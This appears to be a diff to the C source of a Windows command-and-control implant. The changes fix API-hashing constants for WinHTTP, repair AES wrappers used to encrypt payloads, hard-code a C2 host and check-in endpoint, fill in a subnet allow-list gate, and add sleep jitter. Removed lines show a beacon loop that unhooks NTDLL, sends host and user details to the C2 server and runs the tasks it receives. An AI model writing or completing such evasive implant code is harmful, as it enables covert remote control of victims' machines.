@@ -14,15 +14,15 @@
 #define C_PTR(x) (PVOID) (x)
 #define U_PTR(x) (UINT_PTR)(x)
 //Precomputed hashes -run
-#define WINHTTP_DLL_HASH 0x82B9453E            // L"WINHTTP.DLL"
-#define WinHttpOpen_HASH 0xC479B39B            // "WinHttpOpen"
-#define WinHttpConnect_HASH 0xEA5B9A63         // "WinHttpConnect"
-#define WinHttpOpenRequest_HASH 0x9B8D6F2A     // "WinHttpOpenRequest"
-#define WinHttpSendRequest_HASH 0x7F3C1D84     // "WinHttpSendRequest"
-#define WinHttpReceiveResponse_HASH 0xA1E4C729 // "WinHttpReceiveResponse"
-#define WinHttpReadData_HASH 0x3D8F2B51        // "WinHttpReadData"
-#define WinHttpCloseHandle_HASH 0x6C2A9F17     // "WinHttpCloseHandle"
-#define WinHttpQueryHeaders_HASH 0x ? ? ? ? ? ? ? ?
+#define WINHTTP_DLL_HASH 0xC1BEEBA7            // L"WINHTTP.DLL"
+#define WinHttpOpen_HASH 0xB602FC4A            // "WinHttpOpen"
+#define WinHttpConnect_HASH 0x29D5FBCD         // "WinHttpConnect"
+#define WinHttpOpenRequest_HASH 0x08F1A3C9     // "WinHttpOpenRequest"
+#define WinHttpSendRequest_HASH 0xD19AA3C7     // "WinHttpSendRequest"
+#define WinHttpReceiveResponse_HASH 0xEF27FECD // "WinHttpReceiveResponse"
+#define WinHttpReadData_HASH 0x488C0999        // "WinHttpReadData"
+#define WinHttpCloseHandle_HASH 0x7A7F9586     // "WinHttpCloseHandle"
+#define WinHttpQueryHeaders_HASH 0x18C58B22    // "WinHttpQueryHeaders"
 #define C2_HOST L"www.the0dayworkshop.com"
 #define C2_PORT 443
 #define C2_ENDPOINT L"/check-in"
@@ -199,10 +199,10 @@ static UINT32 _Rotr32(UINT32 Value, UINT Count)
     #pragma warning(pop)
 }
 //hashing a ACSII string ( used for function) 
-INT HashStringRotr32A(_In_ PWCHAR String)
+INT HashStringRotr32A(_In_ PCHAR String)
 {
     INT Value =0;
-    for (INT i =0; i<lstrlenW(String);i++)
+    for (INT i =0; i<lstrlenA(String);i++)
     {
         Value = String[i] + _Rotr32(Value, INITIAL_SEED);
     }
@@ -304,11 +304,11 @@ BOOL InstallAesEncryption (PEAS pAES)
     DWORD cbCipherText = NULL;
     NTSTATUS STATUS= NULL;
     //intializing "hAlgorith" as AES algorithm Handle
-    STATUS = BCryptOpenAlgorithmProvider(&hAlgoritm, BCRYPT_AES_ALGORITHM,NULL,0);
+    STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM,NULL,0);
     if(!NT_SUCCESS(STATUS))
     {
         bSTATE = FALSE;
-        goto _endOfFunc;
+        goto _EndOfFunc;
     }
 
   // Getting the size of the key object variable pbKeyObject. This is used by the BCryptGenerateSymmetricKey function later 
@@ -518,41 +518,47 @@ BOOL SimpleEncryption(
     PBYTE pKey,
     PBYTE pIv,
     PVOID* pCipherText,
-    DWORD dwCipherSize
+    DWORD* dwCipherSize
 ){
     AES aes = {0};
     aes.pKey = pKey;
-    aes.pIv =pIv;
-    aes.pPlainText =(PBYTE)pPlaintext;
-    aes.dwPlainSize=dwPlainSize;
-    if (!InstallAesDecryption(&aes)) return FALSE;
+    aes.pIv = pIv;
+    aes.pPlainText = (PBYTE)pPlaintext;
+    aes.dwPlainSize = dwPlainSize;
+    if (!InstallAesEncryption(&aes)) return FALSE;
     *pCipherText = aes.pCipherText;
-    *dwCipherSize =aes.dwCipherSize;
+    *dwCipherSize = aes.dwCipherSize;
     return TRUE;
 }
 BOOL SimpleDecryption(PVOID pCipherText, DWORD dwCipherSize, PBYTE pKey,
-                      PBYTE pIv, PVOID *pPlainText ,DWORD dwPlanSize) {
-    AES aes =
-   aes.pKey =
-   aes.pIv =pIv
-   aes.pPlainText =(
-   aes.dwPlainSize=dwPlainSize
-   if (!InstallAesDecryption
-   *pCipherText = aes.pbPlainText
-   *dwCipherSize =aes.dwPlainSize
-   return TRUE;
+                      PBYTE pIv, PVOID *pPlainText, DWORD* dwPlainSize) {
+    AES aes = {0};
+    aes.pKey = pKey;
+    aes.pIv = pIv;
+    aes.pCipherText = (PBYTE)pCipherText;
+    aes.dwCipherSize = dwCipherSize;
+    if (!InstallAesDecryption(&aes)) return FALSE;
+    *pPlainText = aes.pPlainText;
+    *dwPlainSize = aes.dwPlainSize;
+    return TRUE;
+}
 
 BOOL aes_encrypt_payload(
-   PBYTE plain, DWORD plainLen, PVOID* outCipher,DWORD* outlen
+    PBYTE plain, DWORD plainLen, PVOID* outCipher, DWORD* outLen
 ) {
-    return SimpleEncryption(plain, plainLen, aes_key, aes_iv, outCipher,
-                            outLen) return FALSE;
+    if (!SimpleEncryption(plain, plainLen, aes_key, aes_iv, outCipher,
+                          outLen))
+        return FALSE;
+    return TRUE;
 }
-BOOL aes_encrypt_payload(
-   PBYTE plain, DWORD plainLen, PVOID* outCipher,DWORD* outlen
+
+BOOL aes_decrypt_payload(
+    PBYTE cipher, DWORD cipherLen, PVOID* outPlain, DWORD* outLen
 ) {
-    return SimpleDecryption(cipher, cipherLen, aes_key, aes_iv, outPlain,
-                            outLen) return FALSE;
+    if (!SimpleDecryption(cipher, cipherLen, aes_key, aes_iv, outPlain,
+                          outLen))
+        return FALSE;
+    return TRUE;
 }
 
 
@@ -750,7 +756,7 @@ BOOL unhook_ntdll() {
 */
 static ULONG GetCurrentIpAddress(){
     INTERFACE_INFO Interfaces[10] = {0};
-    WSDATA Data = {0};
+    WSADATA Data = {0};
     SOCKET Socket = {0};
    ULONG AddressIp =0;
    ULONG Length =0;
@@ -779,8 +785,8 @@ END:
 
 BOOL ip_whitelist_gate(){
     //change these values
-    ULONG start = inet_addr("X.X.X.X");
-    ULONG end = inet_addr("X.X.X.X");
+    ULONG start = inet_addr("10.10.30.1");
+    ULONG end = inet_addr("10.10.30.254");
     ULONG ip = GetCurrentIpAddress();
 
     if (ip >= start && ip <= end)
@@ -1231,44 +1237,10 @@ BOOL beacon_post(
     return bSuccess;
 }
 
-VOID beacon_run() {
-
-    // STEP 1 — unhook NTDLL before anything else
-    unhook_ntdll();
-
-    // STEP 2 — check IP whitelist gate
-    // if not in expected subnet → ExitProcess(0)
-    ip_whitelist_gate();
-
-    // STEP 3 — verify C2 is reachable
-    BOOL connected = FALSE;
-    checking_connection(&connected);
-    if (!connected) {
-        ExitProcess(0);
-    }
-
-    // STEP 4 — main beacon loop
-    while (1) {
-
-        // build check-in struct (hostname, username, PID, arch)
-        // serialize to JSON or binary blob
-
-        // encrypt and POST to C2
-        BYTE* taskBlob    = NULL;
-        DWORD taskBlobLen = 0;
-        beacon_post(
-            /* checkin payload */,
-            /* checkin len     */,
-            &taskBlob,
-            &taskBlobLen
-        );
-
-        // if task received → pass to task dispatcher
-        if (taskBlob && taskBlobLen > 0) {
-            dispatch_task(taskBlob, taskBlobLen);  // defined in tasks.c
-        }
-
-        // sleep with Ekko obfuscation + jitter
-        ekko_sleep(jitter(30000));  // 30 second base interval
-    }
+// jitter helper — adds randomness to sleep interval
+DWORD jitter(DWORD baseMs) {
+    DWORD variation = baseMs / 4; // +/- 25%
+    DWORD rnd = 0;
+    _rdrand32_step(&rnd);
+    return baseMs - variation + (rnd % (2 * variation));
 }
